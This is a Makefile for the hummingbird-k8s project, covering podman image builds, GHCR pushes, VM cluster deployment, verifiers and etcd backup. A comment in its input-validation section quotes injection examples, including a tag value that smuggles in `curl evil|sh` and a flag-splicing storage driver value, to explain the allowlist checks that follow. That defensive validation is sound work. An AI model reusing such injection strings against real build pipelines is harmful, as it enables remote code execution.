# hummingbird-k8s — top-level Makefile.
#
# This Makefile is the canonical operator entry point: every recipe below
# delegates to a script under scripts/ rather than open-coding podman /
# virt-install / kubectl invocations. The same scripts are also invoked
# directly by GitHub Actions workflows that need to build images or run
# verifiers, so what works locally is what runs in CI.
#
# Targets are grouped:
#   * image-*         — `podman build` only, no qcow2 (cheap to iterate)
#   * deploy-cluster  — full operator lifecycle (image -> qcow2 -> VMs)
#   * verify-*        — post-deploy verifiers (PSA, audit, encryption, etc.)
#   * clean-*         — tear down local VMs / images
#
# Most VM-touching targets require sudo (libvirt qemu:///system, bib
# loopback mounts). The `image-*` and `push-image-*` targets are
# rootless: they only invoke `podman build` / `podman push` and run
# entirely as the calling user.
#
# Run `make help` to see the discoverable target list.

SHELL := /usr/bin/env bash

# Mirror the LOCAL_IMAGE names build-*.sh use, so image-* targets agree
# with the rest of the toolchain.
IMAGE_K8S    := localhost/hummingbird-k8s:latest
IMAGE_WORKER := localhost/hummingbird-k8s-worker:latest

# Repo-root-relative Containerfile paths — referenced by both
# scripts/build-*.sh AND the CI workflows under .github/workflows/, so
# they live here as the single source of truth.
CONTAINERFILE_K8S    := containers/k8s/Containerfile
CONTAINERFILE_WORKER := containers/k8s-worker/Containerfile

# Registry coordinates for `make push-image-*`. Operators override
# IMAGE_TAG=vX.Y.Z on the command line; GHCR_REGISTRY is rarely changed
# but kept as a knob for forks/mirrors. See "Publishing images" in the
# README for the `gh auth login` + `podman login ghcr.io` prerequisites.
GHCR_REGISTRY ?= ghcr.io/aatchison
IMAGE_TAG     ?= latest

# Optional rootless-podman storage isolation knobs (issue #199 / #230).
# When STORAGE_DRIVER / PODMAN_ROOT / PODMAN_RUNROOT are exported in the
# environment, image-* targets forward them as top-level `podman` flags
# so rootless builds land in the operator's chosen graphroot rather than
# clobbering the system store. Unset = no flag emitted = podman default.
# Mirrors lib/build-common.sh:podman_storage_opts so workstation builds
# stay byte-identical to the build_qcow2 path that consumes them.
#
# Scope note: STORAGE_DRIVER / PODMAN_ROOT / PODMAN_RUNROOT must be set
# for the WHOLE `make` invocation (or exported in the shell), not just
# the push half. `podman tag` and `podman push` only see the image the
# build placed in the alternate root if they are invoked with the same
# --root/--runroot. Splitting the env between a `make image-*` and a
# follow-up `make push-image-*` shell silently uses the default
# graphroot for the second call and fails image-not-found.
PODMAN_BUILD_OPTS := \
        $(if $(STORAGE_DRIVER),--storage-driver $(STORAGE_DRIVER),) \
        $(if $(PODMAN_ROOT),--root $(PODMAN_ROOT),) \
        $(if $(PODMAN_RUNROOT),--runroot $(PODMAN_RUNROOT),)

# Shell-metachar validation for operator-supplied vars (round-2 review,
# #234). Without this an export like
#   STORAGE_DRIVER='overlay --runroot /etc'
# would splice extra flags into every `podman` call below, and a
#   make IMAGE_TAG='v1; curl evil|sh'
# would inject shell into the tag/push lines. We validate each var
# against a conservative allowlist of characters the upstream tool
# documents as legal:
#   * STORAGE_DRIVER / PODMAN_ROOT / PODMAN_RUNROOT — single tokens,
#     alphanumeric + . _ / - (driver names + filesystem paths).
#   * IMAGE_TAG     — OCI tag chars + version separators: A-Z a-z 0-9 . _ : / + -
#   * GHCR_REGISTRY — registry-host + path chars:        A-Z a-z 0-9 . / : _ -
# Each check is a no-op when the var is empty (filter-out of empty vs
# empty is empty). Mismatch => fatal $(error) at Makefile parse time
# (before any recipe runs), so a malicious `make IMAGE_TAG=...` aborts
# before the first shell-out.
_STORAGE_DRIVER_SAFE := $(shell printf %s '$(STORAGE_DRIVER)' | tr -cd 'A-Za-z0-9._/-')
ifneq ($(strip $(STORAGE_DRIVER)),$(strip $(_STORAGE_DRIVER_SAFE)))
$(error STORAGE_DRIVER='$(STORAGE_DRIVER)' contains characters outside [A-Za-z0-9._/-] — refusing to thread into `podman`)
endif
_PODMAN_ROOT_SAFE := $(shell printf %s '$(PODMAN_ROOT)' | tr -cd 'A-Za-z0-9._/-')
ifneq ($(strip $(PODMAN_ROOT)),$(strip $(_PODMAN_ROOT_SAFE)))
$(error PODMAN_ROOT='$(PODMAN_ROOT)' contains characters outside [A-Za-z0-9._/-] — refusing to thread into `podman`)
endif
_PODMAN_RUNROOT_SAFE := $(shell printf %s '$(PODMAN_RUNROOT)' | tr -cd 'A-Za-z0-9._/-')
ifneq ($(strip $(PODMAN_RUNROOT)),$(strip $(_PODMAN_RUNROOT_SAFE)))
$(error PODMAN_RUNROOT='$(PODMAN_RUNROOT)' contains characters outside [A-Za-z0-9._/-] — refusing to thread into `podman`)
endif
_IMAGE_TAG_SAFE := $(shell printf %s '$(IMAGE_TAG)' | tr -cd 'A-Za-z0-9._:/+-')
ifneq ($(strip $(IMAGE_TAG)),$(strip $(_IMAGE_TAG_SAFE)))
$(error IMAGE_TAG='$(IMAGE_TAG)' contains characters outside [A-Za-z0-9._:/+-] — refusing to thread into `podman tag/push`)
endif
_GHCR_REGISTRY_SAFE := $(shell printf %s '$(GHCR_REGISTRY)' | tr -cd 'A-Za-z0-9./:_-')
ifneq ($(strip $(GHCR_REGISTRY)),$(strip $(_GHCR_REGISTRY_SAFE)))
$(error GHCR_REGISTRY='$(GHCR_REGISTRY)' contains characters outside [A-Za-z0-9./:_-] — refusing to thread into `podman tag/push`)
endif

.DEFAULT_GOAL := help
.PHONY: help \
        image-k8s image-worker image-all \
        image-k8s-with-cloud-init image-worker-with-cloud-init \
        push-image-k8s push-image-worker push-image-all \
        deploy-cluster \
        destroy-cluster \
        update-cluster update-workers update-node \
        export-argocd \
        get-kubeconfig \
        switch-to-ghcr \
        nodes kubectl \
        verify-encryption verify-hardening verify-app-deploy verify-all \
        kube-bench \
        backup-etcd restore-etcd rotate-etcd-key \
        ci-build-k8s ci-build-worker \
        print-containerfile-k8s print-containerfile-worker \
        test-lib test-scripts test-all \
        clean-vms clean-images clean

# ---- help ---------------------------------------------------------------

help: ## Show this target list
	@awk 'BEGIN { FS = ":.*##" } \
	      /^[a-zA-Z0-9_-]+:.*##/ { printf "  \033[36m%-22s\033[0m %s\n", $$1, $$2 }' \
	      $(MAKEFILE_LIST)

# ---- image build (no qcow2) --------------------------------------------
# podman-build only; useful for fast lint/iteration and as a smoke test
# without the bib qcow2 step. CI's `containerfile-build` matrix exercises
# the same path.
#
# Designed to run ROOTLESS — no `sudo` in the recipe. Workstation
# operators just run `make image-k8s`; the only state touched is the
# invoking user's podman graphroot (~/.local/share/containers/storage by
# default). qcow2 generation (`scripts/build-*.sh` -> bib) DOES still
# require root for loopback mounts; that path is reached only by
# `make deploy-cluster`, not by these image-* targets. See #230.
#
# $(PODMAN_BUILD_OPTS) threads STORAGE_DRIVER / PODMAN_ROOT /
# PODMAN_RUNROOT through when the operator wants storage isolation
# (issue #199 — concurrent integration runs on a shared host). Unset =
# default podman storage = no extra flags emitted.

image-k8s: ## podman build the k8s control-plane OCI image (rootless)
	podman $(PODMAN_BUILD_OPTS) build -t $(IMAGE_K8S) -f $(CONTAINERFILE_K8S) .

image-worker: ## podman build the k8s-worker template OCI image (rootless)
	# Worker image COPYs worker-join.env via build context. Stub a
	# placeholder when none exists so `make image-worker` works
	# stand-alone (mirrors the pr-validate.yml convention).
	@if [ ! -s worker-join.env ]; then \
	  echo 'kubeadm join 127.0.0.1:6443 --token aaaaaa.bbbbbbbbbbbbbbbb --discovery-token-ca-cert-hash sha256:0000000000000000000000000000000000000000000000000000000000000000' \
	    > worker-join.env; \
	fi
	podman $(PODMAN_BUILD_OPTS) build -t $(IMAGE_WORKER) -f $(CONTAINERFILE_WORKER) .

image-all: image-k8s image-worker ## podman build both OCI images (CP + worker, rootless)

# ---- opt-in cloud-init variants ----------------------------------------
# Convenience targets that flip ENABLE_CLOUD_INIT=1 for a single podman
# build. The resulting image carries the cloud-init package + NoCloud
# datasource so operators can inject per-VM user-data (SSH keys, runcmd,
# packages) via `virt-install --cloud-init` or a libvirt seed ISO. The
# default image-* targets stay byte-identical to pre-cloud-init builds.
# See docs/cloud-init.md.

image-k8s-with-cloud-init: ## podman build the k8s control-plane image with cloud-init opted in (rootless)
	podman $(PODMAN_BUILD_OPTS) build --build-arg ENABLE_CLOUD_INIT=1 -t $(IMAGE_K8S) -f $(CONTAINERFILE_K8S) .

image-worker-with-cloud-init: ## podman build the worker template image with cloud-init opted in (rootless)
	@if [ ! -s worker-join.env ]; then \
	  echo 'kubeadm join 127.0.0.1:6443 --token aaaaaa.bbbbbbbbbbbbbbbb --discovery-token-ca-cert-hash sha256:0000000000000000000000000000000000000000000000000000000000000000' \
	    > worker-join.env; \
	fi
	podman $(PODMAN_BUILD_OPTS) build --build-arg ENABLE_CLOUD_INIT=1 -t $(IMAGE_WORKER) -f $(CONTAINERFILE_WORKER) .

# ---- publish to GHCR ---------------------------------------------------
# Workstation publish path (companion to the tag-driven GHA workflow under
# .github/workflows/build-*.yml). Operators run:
#
#   gh auth login                                  # if not already
#   podman login ghcr.io                           # GH_TOKEN with write:packages
#   make push-image-k8s IMAGE_TAG=v0.1.x           # tag + push CP image
#
# Override GHCR_REGISTRY for forks/mirrors; default is the canonical
# ghcr.io/aatchison namespace. Tagged-release builds in GHA are unaffected
# — those still go through redhat-actions/buildah-build.

push-image-k8s: image-k8s ## podman tag + push the k8s OCI image to $(GHCR_REGISTRY)/hummingbird-k8s:$(IMAGE_TAG)
	podman $(PODMAN_BUILD_OPTS) tag  $(IMAGE_K8S) $(GHCR_REGISTRY)/hummingbird-k8s:$(IMAGE_TAG)
	podman $(PODMAN_BUILD_OPTS) push $(GHCR_REGISTRY)/hummingbird-k8s:$(IMAGE_TAG)

push-image-worker: image-worker ## podman tag + push the worker OCI image to $(GHCR_REGISTRY)/hummingbird-k8s-worker:$(IMAGE_TAG)
	podman $(PODMAN_BUILD_OPTS) tag  $(IMAGE_WORKER) $(GHCR_REGISTRY)/hummingbird-k8s-worker:$(IMAGE_TAG)
	podman $(PODMAN_BUILD_OPTS) push $(GHCR_REGISTRY)/hummingbird-k8s-worker:$(IMAGE_TAG)

push-image-all: push-image-k8s push-image-worker ## podman push both OCI images (CP + worker) to $(GHCR_REGISTRY)

# ---- cluster lifecycle (sudo) ------------------------------------------
# The canonical operator entry point. `deploy-cluster` builds (or pulls)
# the CP + worker images, converts them to qcow2 via bib, generates per-VM
# cloud-init seeds, virt-installs the CP, waits for it Ready, then joins
# the workers. Tear down with `destroy-cluster`, roll bootc upgrades with
# `update-cluster`. See docs/deploy-cluster.md for the full flow.
#
# --preserve-env passes HOME (used by cluster config templates), plus the
# podman storage isolation vars (issue #199) so the inner sudo'd
# deploy-cluster.sh + lib/build-common.sh:build_qcow2 see them. Outer
# sudo --preserve-env already carries them in from CI; the Makefile recipe
# re-launches sudo a second time and would otherwise strip the vars at the
# inner sudo's env_reset.
deploy-cluster: ## Deploy a hybrid bib+cloud-init cluster from CONFIG=<path> (see cluster.example.conf)
	@[ -n "$(CONFIG)" ] || { echo 'CONFIG=<path-to-cluster.local.conf> required (start from cluster.example.conf)' >&2; exit 2; }
	sudo --preserve-env=HOME,STORAGE_DRIVER,PODMAN_ROOT,PODMAN_RUNROOT \
	  bash scripts/deploy-cluster.sh "$(CONFIG)"

destroy-cluster: ## Tear down a cluster defined in CONFIG=<path> (destroys VMs + qcow2s + seed ISOs)
	@[ -n "$(CONFIG)" ] || { echo 'CONFIG=<path-to-cluster.local.conf> required' >&2; exit 2; }
	sudo --preserve-env=HOME,STORAGE_DRIVER,PODMAN_ROOT,PODMAN_RUNROOT \
	  bash scripts/destroy-cluster.sh "$(CONFIG)"

# update-cluster delegates to scripts/update-cluster.sh. FLAGS= is a
# passthrough for extra flags so operators don't have to drop down to the
# raw script invocation for things like --dry-run, --parallel=N,
# --start-from=NAME, --continue-on-error, --no-delete-emptydir-data, or
# --skip-drain. Example:
#   make update-cluster CONFIG=cluster.local.conf FLAGS='--dry-run --parallel=2'
update-cluster: ## Rolling bootc upgrade across CP + workers (with bootID + daemonset gates) from CONFIG=<path> (FLAGS=… for extra flags)
	@[ -n "$(CONFIG)" ] || { echo 'CONFIG=<path-to-cluster.local.conf> required' >&2; exit 2; }
	@CONFIG="$(CONFIG)" sudo --preserve-env=HOME,STORAGE_DRIVER,PODMAN_ROOT,PODMAN_RUNROOT,CONFIG \
	  bash scripts/update-cluster.sh $(FLAGS)

update-workers: ## Rolling bootc upgrade across workers only (with bootID + daemonset gates) from CONFIG=<path> (FLAGS=… for extra flags)
	@[ -n "$(CONFIG)" ] || { echo 'CONFIG=<path-to-cluster.local.conf> required' >&2; exit 2; }
	@CONFIG="$(CONFIG)" sudo --preserve-env=HOME,STORAGE_DRIVER,PODMAN_ROOT,PODMAN_RUNROOT,CONFIG \
	  bash scripts/update-cluster.sh --workers-only $(FLAGS)

update-node: ## Update a single node (NODE=name) (with bootID + daemonset gates) from CONFIG=<path> (FLAGS=… for extra flags)
	@[ -n "$(CONFIG)" ] || { echo 'CONFIG=<path-to-cluster.local.conf> required' >&2; exit 2; }
	@[ -n "$(NODE)" ]   || { echo 'NODE=<name> required (CP_NAME or one of WORKER_NAMES)' >&2; exit 2; }
	@CONFIG="$(CONFIG)" NODE="$(NODE)" sudo --preserve-env=HOME,STORAGE_DRIVER,PODMAN_ROOT,PODMAN_RUNROOT,CONFIG,NODE \
	  bash scripts/update-cluster.sh --node="$(NODE)" $(FLAGS)

export-argocd: ## Export an ArgoCD-registerable kubeconfig (OUTPUT=, SERVER=, CONTEXT=, FORCE=1, PROXY_JUMP=)
	@[ -n "$(CONFIG)" ] || { echo 'CONFIG=<path-to-cluster.local.conf> required' >&2; exit 2; }
	@CONFIG="$(CONFIG)" bash scripts/export-argocd.sh \
		$(if $(OUTPUT),--output "$(OUTPUT)",) \
		$(if $(SERVER),--server "$(SERVER)",) \
		$(if $(CONTEXT),--context-name "$(CONTEXT)",) \
		$(if $(PROXY_JUMP),--proxy-jump="$(PROXY_JUMP)",) \
		$(if $(FORCE),--force,)

# Daily-use sibling of export-argocd (issue #195). Same fetch+rewrite
# primitive in scripts/export-argocd.sh, but with operator-facing
# defaults:
#   - OUTPUT=kubeconfig.yaml (not argocd-kubeconfig.yaml)
#   - --context-name=$CP_NAME (no "hummingbird-" prefix — operators
#     expect `kubectl --context=<CP_NAME>` to match the libvirt domain
#     name, while export-argocd uses the prefixed form to avoid
#     colliding with whatever ArgoCD already has registered).
# CONTEXT=/SERVER=/FORCE= still pass through.
# Recipe sources CONFIG here to read CP_NAME for the default context name;
# the script re-sources CONFIG itself, so this is read-only / advisory.
get-kubeconfig: ## Fetch kubeconfig.yaml from CONFIG=<path> (OUTPUT=, SERVER=, CONTEXT=, FORCE=1, PROXY_JUMP=)
	@[ -n "$(CONFIG)" ] || { echo 'CONFIG=<path-to-cluster.local.conf> required' >&2; exit 2; }
	@[ -r "$(CONFIG)" ] || { echo '[get-kubeconfig] CONFIG not readable: $(CONFIG)' >&2; exit 2; }
	@set -e; \
	  source "$(CONFIG)"; \
	  : "$${CP_NAME:?[get-kubeconfig] CP_NAME required in $(CONFIG)}"; \
	  CONTEXT_FROM_CONF="$(if $(CONTEXT),$(CONTEXT),$${CP_NAME})"; \
	  CONFIG="$(CONFIG)" bash scripts/export-argocd.sh \
	    --output "$(if $(OUTPUT),$(OUTPUT),kubeconfig.yaml)" \
	    --context-name "$$CONTEXT_FROM_CONF" \
	    $(if $(SERVER),--server "$(SERVER)",) \
	    $(if $(PROXY_JUMP),--proxy-jump="$(PROXY_JUMP)",) \
	    $(if $(FORCE),--force,)

switch-to-ghcr: ## Switch all deployed VMs to track ghcr.io/aatchison/hummingbird-<flavor>:latest (#138)
	bash scripts/switch-to-ghcr.sh

# ---- convenience -------------------------------------------------------

nodes: ## kubectl get nodes via the SSH-tunnel wrapper (CONFIG=<path> to read CP_NAME/KVM_HOST from cluster.local.conf)
	@CONFIG="$(CONFIG)" bash scripts/kubectl-k8s.sh get nodes

kubectl: ## kubectl pass-through; ARGS='get pods -A' (CONFIG=<path> to read CP_NAME/KVM_HOST from cluster.local.conf)
	@CONFIG="$(CONFIG)" bash scripts/kubectl-k8s.sh $(ARGS)

# ---- verification ------------------------------------------------------

verify-encryption: ## Verify etcd encryption-at-rest on the control plane
	bash scripts/verify-encryption.sh

verify-hardening: ## Verify PSA + audit + kubelet protect-kernel-defaults
	bash scripts/verify-hardening.sh

verify-app-deploy: ## End-to-end PSA-restricted nginx + pod-to-pod test
	bash scripts/verify-app-deploy.sh

verify-all: verify-encryption verify-hardening verify-app-deploy ## All three verifiers in sequence

kube-bench: ## Run CIS Kubernetes Benchmark (kube-bench) against the cluster
	bash scripts/run-kube-bench.sh

# ---- backup / restore --------------------------------------------------
# etcd snapshot lifecycle. See docs/backup-restore.md for cadence,
# encryption-key handling, and full DR walkthrough.

backup-etcd: ## Snapshot etcd; optional LABEL=<text> appends to filename
	bash scripts/backup-etcd.sh $(if $(LABEL),--label $(LABEL),)

restore-etcd: ## Restore etcd from a snapshot (SNAP=path.db required)
	@[ -n "$(SNAP)" ] || { echo 'SNAP=<path-to-snapshot.db> required' >&2; exit 2; }
	bash scripts/restore-etcd.sh "$(SNAP)"

rotate-etcd-key: ## Walk the operator through etcd encryption-key rotation (#120)
	bash scripts/rotate-etcd-encryption-key.sh

# ---- CI integration ----------------------------------------------------
# The redhat-actions/buildah-build action in .github/workflows/build-*.yml
# is what actually publishes signed images to GHCR — these targets are
# the local-equivalent shell path, identical to `image-*` above. They
# exist so CI workflows can keep one of two contracts (action vs. shell)
# without divergence creeping in. See pr-validate.yml's matrix entries
# which call podman build with the same Containerfile path variables.

ci-build-k8s: image-k8s ## Local-equivalent of build-k8s.yml's buildah step

ci-build-worker: image-worker ## Local-equivalent of build-worker.yml's buildah step

# Path-emitting helpers — used by CI to discover the canonical
# Containerfile location without grepping the Makefile. Example:
#   make -s print-containerfile-k8s   →   containers/k8s/Containerfile

print-containerfile-k8s: ## Print Containerfile path for the k8s flavor
	@echo $(CONTAINERFILE_K8S)

print-containerfile-worker: ## Print Containerfile path for the k8s-worker flavor
	@echo $(CONTAINERFILE_WORKER)

# ---- unit tests --------------------------------------------------------
# bats unit tests for lib/build-common.sh helper functions (issue #106).
# Runs in a pinned bats container so the host doesn't need bats installed.
# The same invocation is mirrored by pr-validate.yml's unit-tests-lib job.

BATS_IMAGE := docker.io/bats/bats@sha256:79d759937f23b7ca8743b01c1a5e3843c556edee1bb29cb3450d55c8436e1300

test-lib: ## Run bats unit tests for lib/build-common.sh
	podman run --rm -v "$(CURDIR):/repo:Z" -w /repo $(BATS_IMAGE) tests/lib/

test-scripts: ## Run bats unit tests for scripts/ (update-cluster.sh, export-argocd.sh)
	podman run --rm -v "$(CURDIR):/repo:Z" -w /repo $(BATS_IMAGE) tests/scripts/

test-all: test-lib test-scripts ## Run all bats unit suites (lib + scripts)

# ---- cleanup -----------------------------------------------------------

clean-vms: ## Destroy + undefine all hummingbird-* VMs (sudo)
	@for d in $$(virsh -c qemu:///system list --all --name 2>/dev/null \
	             | grep '^hummingbird-'); do \
	  echo "Destroying $$d"; \
	  virsh -c qemu:///system destroy "$$d" 2>/dev/null || true; \
	  virsh -c qemu:///system undefine "$$d" 2>/dev/null || true; \
	done

clean-images: ## Remove the local OCI build outputs
	-podman image rm $(IMAGE_K8S) $(IMAGE_WORKER) 2>/dev/null || true

clean: clean-vms clean-images ## Destroy all VMs and remove local images
